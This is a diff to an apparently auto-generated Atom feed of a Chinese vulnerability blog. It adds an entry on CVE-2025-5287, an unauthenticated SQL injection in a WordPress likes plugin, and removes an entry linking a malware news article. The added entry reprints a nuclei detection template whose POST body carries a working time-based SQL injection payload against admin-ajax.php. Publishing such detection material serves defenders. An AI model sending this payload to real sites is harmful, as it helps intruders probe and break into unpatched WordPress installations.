@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-22T13:45:11.486Z</updated>
+  <updated>2025-06-22T15:15:12.543Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Likes and Dislikes Wordpress Plugin Unauthenticated SQLi Vulnerability</title>
+    <link href="http://example.com/2025/06/22/github_367994366/"/>
+    <id>http://example.com/2025/06/22/github_367994366/</id>
+    <published>2025-06-22T15:15:12.544Z</published>
+    <updated>2025-06-22T15:15:12.543Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Likes and Dislikes Wordpress Plugin Unauthenticated SQLi Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5287</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress的Likes and Dislikes插件在所有版本至1.0.0中，由于对用户提供的参数’post’的转义不足以及现有SQL查询的准备不足，存在SQL注入漏洞。这使得未经认证的攻击者可以向现有查询中附加额外的SQL查询，从而用于从数据库中提取敏感信息。漏洞由Khaled Alenazi (Nxploited)披露。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> Likes and Dislikes Plugin</p><p><strong>影响版本：</strong> version &lt;&#x3D; 1.0.0</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/02ff3ce104c9729f6772ad02d3d8c04e8a836870/http%2Fcves%2F2025%2FCVE-2025-5287.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/02ff3ce104c9729f6772ad02d3d8c04e8a836870/http%2Fcves%2F2025%2FCVE-2025-5287.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-5287</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Likes and Dislikes Wordpress Plugin Unauthenticated SQLi Vulnerability</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CodeStuffBreakThings</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Likes and Dislikes Plugin plugin for WordPress is vulnerable to SQL Injection via the &#x27;post&#x27; parameter in all versions up to, and including, 1.0.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. Vulnerability disclosed by Khaled Alenazi (Nxploited).</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">High</span><br>  <span class="hljs-attribute">remediation</span><span class="hljs-punctuation">:</span> <span class="hljs-string">No known patch at this time. Consider removing or disabling the plugin until a patch is released.</span><br>  <span class="hljs-attribute">reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/advisories/GHSA-2q5m-qpc5-76wp</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/inprosysmedia-likes-dislikes-post/likes-and-dislikes-plugin-100-authenticated-subscriber-sql-injection</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/erumfaham/inprosysmedia-likes-dislikes-post</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/Nxploited/CVE-2025-5287</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/wiseep/CVE-2025-5287/tree/main</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">7.5</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-5287</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">likes,dislikes,wordpress,plugin,wp-plugin,unauthenticated,sqli,cve,cve2025,cve-2025-5287</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: POST</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/wp-admin/admin-ajax.php&quot;</span><br>    <span class="hljs-attribute">headers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>      <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>    <span class="hljs-attribute">body</span><span class="hljs-punctuation">:</span> <span class="hljs-string">action=my_likes_dislikes_action&amp;post=1 AND (SELECT 1234 FROM (SELECT(SLEEP(3)))a)&amp;state=like</span><br><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;duration&gt;=3&#x27;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;status_code == 200&#x27;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Likes and Dislikes Wordpress Plugin Una</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Pterodactyl panel 凭证泄露漏洞</title>
@@ -518,33 +544,6 @@
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>GitHub遭黑产利用，76个账号被用于恶意软件攻击</title>
-    <link href="http://example.com/2025/06/21/weixin_4199705163/"/>
-    <id>http://example.com/2025/06/21/weixin_4199705163/</id>
-    <published>2025-06-21T12:18:09.390Z</published>
-    <updated>2025-06-21T12:18:09.384Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/WLW9M9f8_hsKDzff8UJjAA">https://mp.weixin.qq.com/s/WLW9M9f8_hsKDzff8UJjAA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/WLW9M9f8_hsKDzff8UJjAA&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
